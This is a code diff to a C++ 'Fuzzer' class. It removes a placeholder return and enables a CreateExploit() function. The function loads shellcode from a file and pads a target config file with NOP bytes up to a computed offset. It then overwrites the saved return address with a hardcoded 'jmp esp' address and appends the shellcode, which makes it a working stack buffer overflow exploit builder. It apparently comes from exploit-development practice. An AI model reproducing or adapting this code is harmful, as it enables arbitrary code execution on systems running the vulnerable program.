@@ -158,8 +158,6 @@ ChangeBytes(size_t __offset, uint32_t __bytes, size_t __count) {
     return;
   }
 
-  std::cout << __len << '\n';
-
   if (__offset > __len - 1) {
     _Log("Offset greater than file size", true);
     return;
@@ -451,9 +449,6 @@ void
 MyProgram::Fuzzer::
 CreateExploit() {
 
-  std::cout << "To be continued..." << std::endl;
-  return;
-
   std::vector<uint8_t> _shellcode;
   std::fstream __shellFile(
     "shellcode.bin",
@@ -484,16 +479,17 @@ CreateExploit() {
   Backup();
   LoadConfig();
 
-  DeleteByte(size_t(0x30), _data.size() - 0x30);
+  int64_t offset = 0x9da;
+  int64_t count = offset - int64_t(_data.size()) + 0x30;
 
-  InsertByte(size_t(0x30), 0x90, 3016);
+  if (count > 0) { InsertByte(_data.size(), 0x90, size_t(count)); }
 
   // 0x62501297 - jmp esp addr
-  ChangeBytes(size_t(3012 + 0x30), 0x62501297, 1);
+  ChangeBytes(size_t(offset - 0x04 + 0x30), 0x62501297, 1);
 
   _data.insert(_data.end(), _shellcode.begin(), _shellcode.end());
 
-  ChangeBytes(0x10, _data.size() -  0x30, 1);
+  ChangeBytes(0x04, _data.size() -  0x30, 1);
 
   SaveConfig();
 }
